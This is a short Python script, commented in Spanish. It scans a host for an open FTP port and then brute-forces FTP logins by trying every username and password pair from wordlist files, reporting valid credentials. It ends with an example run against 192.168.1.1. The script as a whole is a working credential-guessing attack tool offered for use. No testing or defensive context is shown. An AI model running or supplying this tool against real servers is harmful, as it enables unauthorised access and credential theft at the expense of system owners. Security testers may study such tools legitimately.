import ftplib
import socket

def scan_ip(ip, port):
    # Crear un socket para la conexión
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)  # Establecer un tiempo de espera corto para el escaneo

    # Intentar conectarse al puerto FTP
    try:
        s.connect((ip, port))
        print(f"[+] Puerto {port}/TCP abierto en {ip}")
        return True
    except Exception as e:
        print(f"[-] Error al conectar al puerto {port}/TCP en {ip}: {e}")
        return False
    finally:
        s.close()

def brute_force_ftp(ip, username_file, password_file):
    if scan_ip(ip, 21):  # Escanea el puerto 21 (FTP) en la IP especificada
        # Cargar lista de nombres de usuario
        with open(username_file, 'r') as user_file:
            usernames = [line.strip() for line in user_file.readlines()]

        # Cargar lista de contraseñas
        with open(password_file, 'r') as pass_file:
            passwords = [line.strip() for line in pass_file.readlines()]

        # Intentar iniciar sesión con cada combinación de usuario y contraseña
        for username in usernames:
            for password in passwords:
                try:
                    ftp = ftplib.FTP(ip)
                    ftp.login(username, password)
                    print(f"[+] ¡Credenciales válidas encontradas! Usuario: {username}, Contraseña: {password}")
                    ftp.quit()
                    return
                except ftplib.error_perm:
                    print(f"[-] Intento fallido. Usuario: {username}, Contraseña: {password}")
                    continue

        print("[-] No se encontraron credenciales válidas.")

# Ejemplo de uso:
ip_a_escanear = "192.168.1.1"
brute_force_ftp(ip_a_escanear, "usernames.txt", "passwords.txt")

